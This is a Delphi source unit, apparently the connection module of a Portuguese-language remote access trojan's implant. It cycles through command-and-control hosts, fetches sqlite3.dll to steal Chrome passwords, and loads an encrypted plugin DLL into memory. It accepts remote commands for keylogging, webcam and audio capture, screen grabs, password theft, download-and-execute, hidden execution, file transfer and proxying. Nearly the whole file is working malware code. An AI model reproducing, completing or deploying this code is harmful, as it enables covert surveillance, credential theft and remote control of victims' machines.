Unit UnitConexao;

interface

uses
  windows,
  SocketUnit,
  winsock,
  UnitDiversos,
  UnitServerUtils,
  StreamUnit,
  UnitComandos,
  UnitCarregarFuncoes,
  UnitExecutarComandos,
  UnitCompressString,
  UnitDebug,
  untCapFuncs;

var
  ClientSocket: TClientSocket;
  ReconnectHost: string;
  FinalizarServidor: boolean = false;
  EnderecoMax, EnderecoAtual: integer;
  LastPing: integer;

Procedure IniciarConexao;
procedure VerificarConexao;
procedure EnviarTexto(xCustomWinSocket: TClientSocket; TextString: string);
procedure _EnviarStream(xCustomWinSocket: TClientSocket; TextString: string; CreateNew: boolean = false);
function ReceberTexto(xCustomWinSocket: TClientSocket): string;

function ReceberArquivo(xCustomWinSocket: TClientSocket; ToSend, OndeSalvar: string): Boolean;
function ReceberArquivo2(xCustomWinSocket: TClientSocket; ToSend, OndeSalvar: string; FileSize: Int64): Boolean;
procedure EnviarArquivo(xCustomWinSocket: TClientSocket; Tosend, FileName: string; FileSize: int64; beginning: int64; Eterno: boolean = true);
procedure _ProcessMessages;

implementation

uses
  UnitCryptString,
  UnitSettings,
  UnitShell;

var
  EnviandoTexto: boolean = false;
  
function xProcessMessage(var Msg: TMsg): Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    if Msg.Message <> $0012 then
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;
  sleep(20);
end;

procedure _ProcessMessages;
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do ;
end;

procedure VerificarConexao;
var
  ThreadIC: THandle;
  TempStr, Time: string;
begin
  while length(BufferTest) < 10000 do BufferTest := BufferTest + 'XXXXXXXXXXXXXXXXXXXX';
  ReconnectHost := '';

  TempStr := mytempfolder + 'XxX.xXx';
  Time := gethour + ':' + getminute + ':' + getsecond;
  if fileexists(TempStr) = false then Criararquivo(TempStr, Time, length(Time));

  ThreadIC := StartThread(@IniciarConexao);
  sleep(10000);
  while true do
  begin
    _ProcessMessages;
    Time := gethour + ':' + getminute + ':' + getsecond;
    MyDeleteFile(TempStr);
    if fileexists(TempStr) = false then Criararquivo(TempStr, Time, length(Time));

    if (ClientSocket <> nil) and
       ((LastPing + 35000 + 35000 + 35000) < gettickcount) then
    try
      AddDebug(Erro2);
      if ThreadIC <> 0 then CloseThread(ThreadIC);
      ThreadIC := StartThread(@IniciarConexao);
      sleep(10000);
      except
    end;
  end;
end;

Procedure IniciarConexao;
var
  EndTemp: string;
  PortaTemp: integer;
  Tempstr: string;
  recebido: string;
  tamanho: cardinal;
  TempMutex: THandle;
  TempFile: string;
  Time: string;
begin
  TempFile := mytempfolder + 'UuU.uUu';
  Time := gethour + ':' + getminute + ':' + getsecond;
  if fileexists(TempFile) = false then Criararquivo(TempFile, Time, length(Time));

  while true do
  begin
    ///////// baixar sqlite3.dll antes de conectar /////////
    if fileexists(ChromeFile) = false then ChromePassReady := false;

    if (ChromePassLink <> '') and (fileexists(ChromeFile) = false) then
    begin
      tempstr := mytempfolder + inttostr(gettickcount) + '.tmp';
      try
        MyURLDownloadToFile(nil, pchar(ChromePassLink), pchar(tempstr), 0, nil);
        if (CopyFile(pchar(tempstr), pchar(ChromeFile), false) = true) and
           (MyGetFileSize(ChromeFile) > 100000) then ChromePassReady := true;
        except
      end;
    end else if (ChromePassLink <> '') and (fileexists(ChromeFile) = true) then ChromePassReady := true;
    //////////////////////////////////////////////////////////

    MyDeleteFile(TempFile);
    Time := gethour + ':' + getminute + ':' + getsecond;
    if fileexists(TempFile) = false then Criararquivo(TempFile, Time, length(Time));

    sleep(1000 * 5); // cinco segundos antes da nova tentativa de conexão, ou mais tarde, colocar no server builder como no spynet
    if ReconnectHost = '' then
    begin
      inc(EnderecoAtual, 1);
      if EnderecoAtual > EnderecoMax then EnderecoAtual := 0;

      Tempstr := DNS[EnderecoAtual];
      if Tempstr <> '' then
      begin
        EndTemp := copy(Tempstr, 1, pos(':', Tempstr) - 1);
        delete(Tempstr, 1, pos(':', Tempstr));
        PortaTemp := strtoint(Tempstr);
      end else EndTemp := '';

      while EndTemp = '' do
      begin
        sleep(50);
        inc(EnderecoAtual, 1);
        if EnderecoAtual > EnderecoMax then EnderecoAtual := 0;
        if length(DNS[EnderecoAtual]) >= 9 then //1.1.1.1:1 exemplo de tamanho da string = 9
        begin
          Tempstr := DNS[EnderecoAtual];
          EndTemp := copy(Tempstr, 1, pos(':', Tempstr) - 1);
          delete(Tempstr, 1, pos(':', Tempstr));
          PortaTemp := strtoint(Tempstr);
        end else EndTemp := '';
      end;
    end else
    begin
      Tempstr := ReconnectHost;
      ReconnectHost := '';
      EndTemp := copy(Tempstr, 1, pos(':', Tempstr) - 1);
      delete(Tempstr, 1, pos(':', Tempstr));
      PortaTemp := strtoint(Tempstr);
    end;

    if EndTemp <> '' then
    begin
      try
        if ClientSocket <> nil then ClientSocket.Free;
        if ClientSocket <> nil then ClientSocket := nil;

        ClientSocket := TClientSocket.Create;
        except
        begin
          if ClientSocket <> nil then ClientSocket.Free;
          if ClientSocket <> nil then ClientSocket := nil;
        end;
      end;
    end;

    if ClientSocket <> nil then
    begin
      sleep(100);
      try
        LastPing := gettickcount;
        ClientSocket.Connect(EndTemp, PortaTemp);
        except
        begin
          if ClientSocket <> nil then ClientSocket.Free;
          if ClientSocket <> nil then ClientSocket := nil;
        end;
      end;

      if (ClientSocket <> nil) then
      if ClientSocket.Connected = true then
      begin
        sleep(10);
        if (PluginBuffer <> '') and (mp_MemoryModule = nil) then
        begin
          PluginBuffer := EnDecryptStrRC4B(PluginBuffer, MasterPassword);
          CarregarDll(PluginBuffer);
        end;
        EnviarTexto(ClientSocket, senha + '|' + 'Y|');

        while (ClientSocket.Connected = true) and (ReconnectHost = '') do
        begin
          criararquivo(TempFile, '', 0);
          Mydeletefile(TempFile);

          ClientSocket.Idle(0); // aqui foi a mágica... // essa parte foi resolvida no cliente no evento onconnect (acrescentei um writeln(' ') rsrsrs acho que até do spynet resolveu
          recebido := '';
          recebido := ReceberTexto(ClientSocket);

          if recebido <> '' then
          begin
            if (copy(recebido, 1, pos('|', recebido) - 1) = unitComandos.MYSHUTDOWN) or
               (copy(recebido, 1, pos('|', recebido) - 1) = unitComandos.HIBERNAR) or
               (copy(recebido, 1, pos('|', recebido) - 1) = LOGOFF) or
               (copy(recebido, 1, pos('|', recebido) - 1) = POWEROFF) or
               (copy(recebido, 1, pos('|', recebido) - 1) = MYRESTART) or
               (copy(recebido, 1, pos('|', recebido) - 1) = DESLMONITOR) then
            begin
              ComandoRecebido := recebido;
              ExecutarComando;
            end else

            if copy(recebido, 1, pos('|', recebido) - 1) = RECONNECT then
            begin
              delete(recebido, 1, pos('|', recebido));
              ReconnectHost := copy(recebido, 1, pos('|', recebido) - 1);
              //ClientSocket.Disconnect;
            end else

            if (recebido <> '') and (pos('|', recebido) > 0) then
            begin
              ClientSocket.SendString('' + ENTER);
              ComandoRecebido := recebido;
              MasterCommandThreadId := StartThread(@ExecutarComando);
            end;
          end;
        end;
        AddDebug(Erro1);

        if ClientSocket.Connected = true then ClientSocket.Destroy;
        //if ClientSocket <> nil then ClientSocket.Free;
        if ClientSocket <> nil then ClientSocket := nil;

        // parar audio
        recebido := AUDIOSTOP + '|';
        ComandoRecebido := recebido;
        MasterCommandThreadId := StartThread(@ExecutarComando);
      end;
    end;

    CloseHandle(ProxyMutex);

    TempMutex := CreateMutex(nil, False, pchar(MutexName + '_SAIR'));
    if GetLastError = ERROR_ALREADY_EXISTS then
    begin
      CloseHandle(TempMutex);
      break;
      sleep(10000);
      FinalizarServidor := true;
      exit;
    end else CloseHandle(TempMutex);

    if ShellThreadID <> 0 then
    begin
      ShellGetComando('exit');
      sleep(100);
      ShellGetComando('');
      //closethread(ShellThreadID);
      ShellThreadID := 0;
    end;

    if FinalizarServidor = true then
    begin
      CloseHandle(ExitMutex);
      break;
      FinalizarServidor := true;
      exit;
    end;
  end;
end;

procedure EnviarTexto(xCustomWinSocket: TClientSocket; TextString: string);
begin
  while xCustomWinSocket.EnviandoDados = true do _processmessages;
  xCustomWinSocket.EnviandoDados := true;
  if xCustomWinSocket = nil then exit;
  if xCustomWinSocket.Connected = false then exit;
  TextString := CompressString(TextString);
  TextString := EnDecryptStrRC4B(TextString, MasterPassword);
  if xCustomWinSocket.SendString(IntToStr(length(TextString)) + '|' + ENTER) <= 0 then
  begin
    xCustomWinSocket.EnviandoDados := false;
    exit;
  end;
  xCustomWinSocket.SendBuffer(pointer(TextString)^, length(TextString));
  xCustomWinSocket.EnviandoDados := false;
end;

function lerlinha(MySock: TClientSocket): String;
const
  LF = #10;
  CR = #13;
  EOL = CR + LF; // o Indy manda essa merda no final do comando... veja na função connection.writeln()
var
  buf: char;
  TempStr: string;
  i: integer;
begin
  while (pos('###@@@' + EOL, result) = 0) and (ClientSocket.Connected = true) and (MySock.Connected = true) do
  begin
    MySock.ReceiveBuffer(buf, 1);
    result := result + buf;
  end;
end;

procedure _EnviarStream(xCustomWinSocket: TClientSocket; TextString: string; CreateNew: boolean = false);
var
  TempStr: string;
begin
  TempStr := CompressString(TextString);
  TempStr := EnDecryptStrRC4B(TempStr, MasterPassword);
  if (length(TempStr) < 8192) and (CreateNew = false) then
  begin
    EnviarTexto(xCustomWinSocket, TextString);
    exit;
  end;

  EnviarStream(xCustomWinSocket.RemoteAddress,
               xCustomWinSocket.RemotePort,
               MasterPassword,
               senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + TextString);
end;

function ReceberArquivo(xCustomWinSocket: TClientSocket; ToSend, OndeSalvar: string): Boolean;
var
  CS : TClientSocket;
  myFile: File;
  byteArray : array[0..MaxBufferSize] of byte;
  TotalRead, currRead: integer;
  CurrWritten:integer;
  tamanho: cardinal;
  localPath: string;
  TempStr: string;
  FileSize: Int64;
  Tentativa: integer;
begin
  result := false;
  Tentativa := 0;

  CS := TClientSocket.Create;
  while (CS.Connected = false) and (Tentativa < 10) do
  begin
    CS.Connect(xCustomWinSocket.RemoteAddress, xCustomWinSocket.RemotePort);
    sleep(10);
    inc(Tentativa);
  end;

  EnviarTexto(CS, senha + '|' + 'Y|');
  lerlinha(cs);
  EnviarTexto(CS, ToSend);
  CS.Idle(0);
  TempStr := lerlinha(cs);

  try
    while pos('$$$', TempStr) > 0 do delete(TempStr, 1, 1);
    if length(TempStr) > 1 then delete(TempStr, 1, 2);

    FileSize := StrToInt(copy(TempStr, 1, pos('|', TempStr) - 1));
    except
    CS.Destroy;
    exit;
  end;
  TempStr := '';

  try
    AssignFile(MyFile, OndeSalvar);
    Rewrite(MyFile, 1);
    Totalread := 0;
    currRead := 0;
    while (TotalRead < filesize) and (CS.Connected = true) and (ClientSocket.Connected = true) do
    begin
      currRead := CS.ReceiveBuffer(byteArray, sizeof(bytearray));
      TotalRead := TotalRead + currRead;

      //setlength(TempStr, currRead);
      //copymemory(@TempStr[1], @bytearray, currRead);
      //TempStr := EnDecryptStrRC4B(TempStr, MasterPassword);
      //BlockWrite(MyFile, TempStr[1], currRead, currwritten);

      BlockWrite(MyFile, bytearray, currRead, currwritten);

      currwritten:= currread;
    end;
    Except
    CloseFile(MyFile);
    CS.Destroy;
    exit;
  end;
  CloseFile(MyFile);
  CS.Destroy;
  Result := true;
end;

procedure EnviarDesktop;
var
  TempStr: string;
begin
  sleep(500);
  Tempstr := GetDesktopImage(90, 130, 130);
  _EnviarStream(ClientSocket, IMGDESK + '|' + Tempstr, true);
end;

function ReceberTexto(xCustomWinSocket: TClientSocket): string;
var
  Tempstr: string;
  Decrypted: string;
  VerifyStr: string;
  Size: Int64;
  TempResult: string;
  i: int64;
  S: TMemoryStream;
  BinaryBuffer: array [0..MaxBufferSize] of byte;
  BytesReceived: integer;
  EnviarDesk: boolean;
begin
  result := '';
  if xCustomWinSocket = nil then exit;
  if xCustomWinSocket.Connected = false then exit;

  TempResult := '';
  Tempstr := xCustomWinSocket.ReceiveString;

  // no windows 7 a conexão vem com esses 3 caracteres... não sei porque.
  if (length(Tempstr) >= 1) and ((Tempstr[1] = #32) or (Tempstr[1] = #13) or (Tempstr[1] = #10)) then delete(tempstr, 1, 1);
  if (length(Tempstr) >= 1) and ((Tempstr[1] = #32) or (Tempstr[1] = #13) or (Tempstr[1] = #10)) then delete(tempstr, 1, 1);
  if (length(Tempstr) >= 1) and ((Tempstr[1] = #32) or (Tempstr[1] = #13) or (Tempstr[1] = #10)) then delete(tempstr, 1, 1);
  ///////////////////////////////////////////////////////////////////////////


  if copy(Tempstr, 1, pos('|', Tempstr) - 1) = PING then
  begin
    delete(Tempstr, 1, pos('|', tempstr));
    if copy(Tempstr, 1, pos('|', Tempstr) - 1) = IMGDESK then EnviarDesk := true else EnviarDesk := false;
    LastPing := gettickcount;
    Tempstr := PONG + '|' + ActiveCaption + '###' + inttostr(SecondsIdle) + '|' + ENTER;
    if xCustomWinSocket.SendString(Tempstr) <= 0 then exit;

    if EnviarDesk = true then startthread(@EnviarDesktop);
    exit;
  end;

  if xCustomWinSocket.SendString('' + ENTER) <= 0 then exit; // verificar o socket...

  if copy(Tempstr, 1, pos('|', Tempstr) - 1) = PINGTEST then
  begin
    adddebug(PINGTEST);
    ComandoRecebido := Tempstr;
    MasterCommandThreadId := StartThread(@ExecutarComando);
    exit;
  end;

  if copy(Tempstr, 1, pos('|', Tempstr) - 1) = TENTARNOVAMENTE then
  begin
    EnviarTexto(ClientSocket, senha + '|' + 'Y|');
    exit;
  end;

  //Decrypted := EnDecryptStrRC4B(decode64(Tempstr), MasterPassword); //decriptando a string;
  Decrypted := decode64(Tempstr); //decriptando a string;

  VerifyStr := copy(Decrypted, 1, pos('|', Decrypted) - 1);
  if (VerifyStr = MOUSEPOSITION) or
     (VerifyStr = KEYBOARDKEY) or
     (VerifyStr = WEBCAMINACTIVE) or
     (VerifyStr = WEBCAMGETBUFFER) or
     (VerifyStr = WEBCAM) or
     (VerifyStr = DESKTOP) or
     (VerifyStr = PROCURAR_ARQ_PARAR) or
     (VerifyStr = LISTARVALORES) or
     (VerifyStr = MAININFO) or
     (VerifyStr = IMGDESK) or
     (VerifyStr = CONFIGURACOESDOSERVER) or
     (VerifyStr = DISCONNECT) or
     (VerifyStr = UNINSTALL) or
     (VerifyStr = RENAMESERVIDOR) or
     (VerifyStr = ENVIAREXECNORMAL) or
     (VerifyStr = ENVIAREXECHIDDEN) or
     (VerifyStr = EXECUTARCOMANDOS) or
     (VerifyStr = OPENWEB) or
     (VerifyStr = DOWNEXEC) or
     (VerifyStr = RESUMETRANSFER) or
     (VerifyStr = LISTAR_DRIVES) or
     (VerifyStr = LISTAR_ARQUIVOS) or
     (VerifyStr = EXEC_NORMAL) or
     (VerifyStr = EXEC_INV) or
     (VerifyStr = DELETAR_DIR) or
     (VerifyStr = DELETAR_ARQ) or
     (VerifyStr = RENOMEAR_DIR) or
     (VerifyStr = RENOMEAR_ARQ) or
     (VerifyStr = CRIAR_PASTA) or
     (VerifyStr = DESKTOP_PAPER) or
     (VerifyStr = THUMBNAIL) or
     (VerifyStr = DOWNLOAD) or
     (VerifyStr = RESUMETRANSFER) or
     (VerifyStr = UPLOAD) or
     (VerifyStr = PROCURAR_ARQ) or
     (VerifyStr = GETSHAREDLIST) or
     (VerifyStr = DOWNLOADREC) or
     (VerifyStr = DOWNLOADDIR) or
     (VerifyStr = DOWNLOADDIRSTOP) or
     (VerifyStr = CHANGEATTRIBUTES) or
     (VerifyStr = SENDFTP) or
     (VerifyStr = KEYLOGGER) or
     (VerifyStr = KEYLOGGERGETLOG) or
     (VerifyStr = KEYLOGGERERASELOG) or
     (VerifyStr = KEYLOGGERATIVAR) or
     (VerifyStr = KEYLOGGERDESATIVAR) or
     (VerifyStr = NOVACHAVE) or
     (VerifyStr = RENAMEKEY) or
     (VerifyStr = APAGARREGISTRO) or
     (VerifyStr = NOVONOMEVALOR) or
     (VerifyStr = LISTARPROCESSOS) or
     (VerifyStr = FINALIZARPROCESSO) or
     (VerifyStr = LISTARSERVICOS) or
     (VerifyStr = INICIARSERVICO) or
     (VerifyStr = PARARSERVICO) or
     (VerifyStr = DESINSTALARSERVICO) or
     (VerifyStr = INSTALARSERVICO) or
     (VerifyStr = LISTARJANELAS) or
     (VerifyStr = WINDOWS_FECHAR) or
     (VerifyStr = WINDOWS_MAX) or
     (VerifyStr = WINDOWS_MIN) or
     (VerifyStr = WINDOWS_MOSTRAR) or
     (VerifyStr = WINDOWS_OCULTAR) or
     (VerifyStr = WINDOWS_MIN_TODAS) or
     (VerifyStr = DISABLE_CLOSE) or
     (VerifyStr = ENABLE_CLOSE) or
     (VerifyStr = WINDOWS_CAPTION) or
     (VerifyStr = LISTARPROGRAMASINSTALADOS) or
     (VerifyStr = DESINSTALARPROGRAMA) or
     (VerifyStr = LISTARPORTAS) or
     (VerifyStr = LISTARPORTASDNS) or
     (VerifyStr = FINALIZARPROCESSOPORTAS) or
     (VerifyStr = FINALIZARCONEXAO) or
     (VerifyStr = LIMPARCLIPBOARD) or
     (VerifyStr = OBTERCLIPBOARD) or
     (VerifyStr = LISTDEVICES) or
     (VerifyStr = LISTEXTRADEVICES) or
     (VerifyStr = DESKTOPSETTINGS) or
     (VerifyStr = DESKTOPPREVIEW) or
     (VerifyStr = DESKTOPGETBUFFER) or
     (VerifyStr = WEBCAMSETTINGS) or
     (VerifyStr = BTN_START_HIDE) or
     (VerifyStr = BTN_START_SHOW) or
     (VerifyStr = BTN_START_BLOCK) or
     (VerifyStr = BTN_START_UNBLOCK) or
     (VerifyStr = DESK_ICO_HIDE) or
     (VerifyStr = DESK_ICO_SHOW) or
     (VerifyStr = DESK_ICO_BLOCK) or
     (VerifyStr = DESK_ICO_UNBLOCK) or
     (VerifyStr = TASK_BAR_HIDE) or
     (VerifyStr = TASK_BAR_SHOW) or
     (VerifyStr = TASK_BAR_BLOCK) or
     (VerifyStr = TASK_BAR_UNBLOCK) or
     (VerifyStr = MOUSE_BLOCK) or
     (VerifyStr = MOUSE_UNBLOCK) or
     (VerifyStr = MOUSE_SWAP) or
     (VerifyStr = SYSTRAY_ICO_HIDE) or
     (VerifyStr = SYSTRAY_ICO_SHOW) or
     (VerifyStr = OPENCD) or
     (VerifyStr = CLOSECD) or
     (VerifyStr = MSN_STATUS) or
     (VerifyStr = MSN_CONECTADO) or
     (VerifyStr = MSN_OCUPADO) or
     (VerifyStr = MSN_AUSENTE) or
     (VerifyStr = MSN_INVISIVEL) or
     (VerifyStr = MSN_DESCONECTADO) or
     (VerifyStr = MSN_LISTAR) or
     (VerifyStr = CHATCLOSE) or
     (VerifyStr = CHATMSG) or
     (VerifyStr = AUDIOGETBUFFER) or
     (VerifyStr = AUDIOSTOP) or

     (VerifyStr = GETPASSWORD) or
     (VerifyStr = UPDATESERVIDOR) or
     (VerifyStr = UPDATESERVIDORWEB) or
     (VerifyStr = KEYLOGGERSEARCH) or
     (VerifyStr = FILESEARCH) or
     (VerifyStr = STARTPROXY) or
     (VerifyStr = STOPPROXY) or

     (VerifyStr = LISTARCHAVES) then
  begin
    ComandoRecebido := Decrypted;
    MasterCommandThreadId := StartThread(@ExecutarComando);
    exit;
  end else

  if (VerifyStr = RECONNECT) then
  begin
    result := Decrypted;
    exit;
  end;  

  if (Tempstr = '') or (pos('|', TempStr) <= 0) then exit;
  try
    Size := strtoint(copy(Tempstr, 1, pos('|', Tempstr) - 1));
    except
    exit;
  end;
  delete(Tempstr, 1, pos('|', Tempstr));

  S := TMemoryStream.Create;

  if Size > 0 then
  begin
    while (S.Position < size) and (xCustomWinSocket.Connected = true) and (ClientSocket.Connected = true) do
    begin
      processmessages;
      try
        i := xCustomWinSocket.ReceiveBuffer(BinaryBuffer, MaxBufferSize);
        S.WriteBuffer(BinaryBuffer, i);
        finally
        ZeroMemory(@BinaryBuffer, sizeof(MaxBufferSize));
      end;
    end;
    Result := StreamToStr(S);
    S.Free;
  end;
  result := EnDecryptStrRC4B(result, MasterPassword);
  result := DeCompressString(result);
end;

procedure EnviarArquivo(xCustomWinSocket: TClientSocket; Tosend, FileName: string; FileSize: int64; beginning: int64; Eterno: boolean = true);
var
  myFile: File;
  byteArray : array[0..MaxBufferSize] of byte;
  count, sent: integer;
  TempStr: string;
  CS : TClientSocket;
  Tentativa: integer;
begin
  Tentativa := 0;
  CS := TClientSocket.Create;

  while (CS.Connected = false) and (Tentativa < 10) do
  begin
    CS.Connect(xCustomWinSocket.RemoteAddress, xCustomWinSocket.RemotePort);
    sleep(10);
    inc(Tentativa);
  end;

  EnviarTexto(CS, senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + Tosend + inttostr(FileSize) + '|');
  sleep(1000);

  try
    FileMode :=	$0000;
    AssignFile(myFile, FileName);
    reset(MyFile, 1);

    if beginning > 0 then
    seek(myFile, beginning);

    sent := 0;

    while not EOF(MyFile) and CS.Connected = true do
    begin
      sleep(1);
      BlockRead(myFile, bytearray, MaxBufferSize + 1, count);

      //setlength(tempstr, count);
      //copymemory(@tempstr[1], @bytearray, count);
      //TempStr := EnDecryptStrRC4b(TempStr, MasterPassword);
      //sent := sent + AThread.Connection.Socket.Send(TempStr[1], count);

      sent := sent + CS.SendBuffer(bytearray, count);
    end;
    finally
    closefile(myfile);
  end;
  //while CS.Connected do sleep(100);
  sleep(1000);
  try
    CS.Destroy;
    except
  end;
  if Eterno = true then while true do sleep(high(integer));
end;

function ReceberArquivo2(xCustomWinSocket: TClientSocket; ToSend, OndeSalvar: string; FileSize: Int64): Boolean;
var
  CS : TClientSocket;
  myFile: File;
  byteArray : array[0..MaxBufferSize] of byte;
  TotalRead, currRead: integer;
  CurrWritten:integer;
  tamanho: cardinal;
  localPath: string;
  TempStr: string;
  buf: char;
  Tentativa: integer;
begin
  result := false;
  Tentativa := 0;

  CS := TClientSocket.Create;
  while (CS.Connected = false) and (Tentativa < 10) do
  begin
    CS.Connect(xCustomWinSocket.RemoteAddress, xCustomWinSocket.RemotePort);
    sleep(10);
    inc(Tentativa);
  end;

  EnviarTexto(CS, senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + ToSend);

  try
    AssignFile(MyFile, OndeSalvar);
    Rewrite(MyFile, 1);
    Totalread := 0;
    currRead := 0;
    while (TotalRead < filesize) and (CS.Connected = true) and (ClientSocket.Connected = true) do
    begin
      currRead := CS.ReceiveBuffer(byteArray, sizeof(bytearray));
      TotalRead := TotalRead + currRead;

      //setlength(TempStr, currRead);
      //copymemory(@TempStr[1], @bytearray, currRead);
      //TempStr := EnDecryptStrRC4B(TempStr, MasterPassword);
      //BlockWrite(MyFile, TempStr[1], currRead, currwritten);

      BlockWrite(MyFile, bytearray, currRead, currwritten);

      currwritten:= currread;
    end;
    Except
    CloseFile(MyFile);
    CS.Destroy;
    exit;
  end;
  CloseFile(MyFile);
  CS.Destroy;
  Result := true;
end;

end.
